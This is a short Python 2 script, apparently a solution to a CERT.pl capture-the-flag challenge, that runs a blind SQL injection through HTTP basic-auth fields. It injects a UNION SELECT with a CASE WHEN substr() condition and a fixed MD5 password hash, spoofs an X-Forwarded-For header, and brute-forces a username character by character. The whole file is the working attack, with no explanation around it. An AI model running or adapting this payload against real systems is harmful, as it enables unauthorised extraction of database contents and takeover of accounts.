#!/usr/bin/env python
import requests


query = "name' or '1'='2' UNION SELECT 'user', CASE WHEN (SELECT substr(login, {},1) FROM users LIMIT 1,1)='{}' THEN '5f4dcc3b5aa765d61d8327deb882cf99' ELSE '' END--"

url = 'http://ecsm2017.cert.pl:6044/index.php/instructions'

headers = {
    "User-Agent": "hackerone.com/bl4de",
    "X-Forwarded-For": "175.45.176.100"
}

login = ''
for rep in range(1, 30):
    for c in 'abcdefghijklmnopqrstuwvxyzABCDEFGHNIJKLMNOPQRSTUWVXYZ1234567890-_[]()$#%&*!+=-;<>?/':
        auth = (
            query.format(rep, c), 'password'
        )
        resp = requests.get(url, auth=auth, headers=headers)
        if '</h2><h3>' in resp.content:
            login = login + c
            print '[+] found username: {}'.format(login)
            continue

print '[+] finished!!!'
